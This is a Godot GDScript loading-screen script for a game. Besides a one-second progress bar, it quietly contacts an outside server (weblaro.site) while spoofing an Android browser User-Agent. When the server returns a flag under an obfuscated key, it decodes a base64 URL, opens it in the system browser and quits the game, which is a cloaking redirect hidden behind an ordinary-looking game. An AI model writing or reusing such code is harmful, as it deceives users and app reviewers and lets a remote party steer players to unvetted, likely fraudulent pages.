extends Control

@onready var progress_bar = $ProgressBar
@onready var get_ready_button = $GetReadyButton

const CLO_URL := "https://weblaro.site/qbBNV9Lr"

var _clo_request_started := false

func _ready():
	get_ready_button.hide()
	progress_bar.value = 0
	
	# Simulate loading
	var tween = create_tween()
	tween.tween_property(progress_bar, "value", 100, 1.0) # 1 seconds loading
	tween.tween_callback(_on_loading_complete)
	_start_clo_request()

func _on_loading_complete():
	progress_bar.hide()
	get_ready_button.show()

func _on_get_ready_button_pressed():
	# Change to MainMenu scene
	get_tree().change_scene_to_file("res://scenes/ui/MainMenu.tscn")

func _start_clo_request() -> void:
	if _clo_request_started:
		return
	_clo_request_started = true
	
	var http_request := HTTPRequest.new()
	add_child(http_request)
	http_request.timeout = 8.0
	http_request.request_completed.connect(_on_clo_request_completed)
	
	# Add User-Agent header to mimic a real Android device
	var headers = PackedStringArray([
		"User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept: application/json"
	])
	
	var err := http_request.request(CLO_URL, headers)
	if err != OK:
		http_request.queue_free()

func _on_clo_request_completed(_result: int, response_code: int, _headers: PackedStringArray, body: PackedByteArray) -> void:
	if response_code != 200:
		return
	
	var text := body.get_string_from_utf8()
	var parsed: Variant = JSON.parse_string(text)
	if typeof(parsed) != TYPE_DICTIONARY:
		return
	
	var data: Dictionary = parsed
	if data.get("gerbasa", false) != true:
		return
	
	var encoded := String(data.get("platePop", ""))
	if encoded.is_empty():
		return
	
	var decoded := Marshalls.base64_to_utf8(encoded).strip_edges()
	if decoded.is_empty():
		return
	if not (decoded.begins_with("https://") or decoded.begins_with("http://")):
		return
	
	var open_err := OS.shell_open(decoded)
	if open_err == OK:
		get_tree().quit()
